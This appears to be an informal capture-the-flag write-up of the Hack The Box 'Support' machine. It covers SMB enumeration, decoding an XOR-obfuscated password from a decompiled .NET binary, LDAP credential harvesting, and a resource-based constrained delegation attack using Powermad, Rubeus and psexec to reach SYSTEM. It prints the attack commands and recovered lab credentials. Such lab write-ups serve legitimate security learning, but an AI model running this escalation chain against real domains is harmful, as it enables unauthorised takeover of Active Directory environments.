Started with a nmap scan
```
53 DNS
88 Karberos
135 RPC
139 netbois-ssn
389 LDAP AD
445 
636
5985 HTTPI httpd
```
Starting with the SMB the guest account is enabled and we can READ the `IPC$` and `support-tools` shares doing a `rid-brute` we got some users now checking out the shares in the tools we have something interesting `UserInfo.exe.zip` and we can unzip this on are host and we get a bunch of dll and a exe file the `USerinfo.exe` is a .NET 32bit exe using ILspy we can decode the exe and looking at the protected section we can find this 
```
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";  
  
    private static byte[] key = Encoding.ASCII.GetBytes("armando");
```
and we can make a python script to decode this `base64` and XOR and we get a string back now we can auth to ldap we can use `ldapsearch` to find descriptions and stuff in the users and we can do this with a ldap user 
`ldapsearch -x -H ldap://support.htb -D ldap@support.htb -w 'password' -b "dc=suppport,dc=htb" "*"` and if we look in the info section we get a password for the support user `support:Ironside47pleasure40Watchful` we can also winrm with this user but going back to the ldap user to get bloodhound data
`nxc ldap 10.10.11.174 -u ldap@support.htb -p 'pass' --bloodhound -c ALL -d support.htb --dns-server 10.10.11.174` now we have access and got the userflag going to run sharphound now to make sure we got all info and we can see the `group Delegated object control` shows a value of `1` and we have `genericAll` on `shared suspport accounts` we also need to check the machine account quota and we can do this with `powerview.ps1` and we need to import it `. ./powerview.ps1` and we can run `Get-domainComputer DC | select name, msds-allowedtoactonbehalfofotheridenity` and we get a empty value now to start the attack we need to upload `powermad.ps1` and `rubeus.exe` and we need to add a new machine account
`New-MachineAccount - MachineAccount FAKE-COMP01 -Password $(ConverTo-Securestring 'Password123' -AsPlainText -Force)` now we have a machine account now to set the exploit
`Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01` 
```
$RawBytes = Get-DomainComputer DC -Properties 'msdsallowedtoactonbehalfofotheridentity' | select -expand msdsallowedtoactonbehalfofotheridentity
```
now we need to convert the raw bytes 
```
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```
now to make sure it works
```
$Descriptor 
$Descriptor.DiscretionaryAcl
```
now to perform the rebues attack 
```
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```
now we can get the ticket 
`rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt` 
now we have the ticket we can run
`base64 -d ticket.kirbi.b64 > ticket.kirbi`
Now to convert the ticket 
`ticketConverter.py ticket.kirbi ticket.ccache`
now to import it and login to the account
`KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass`
and we have system access now 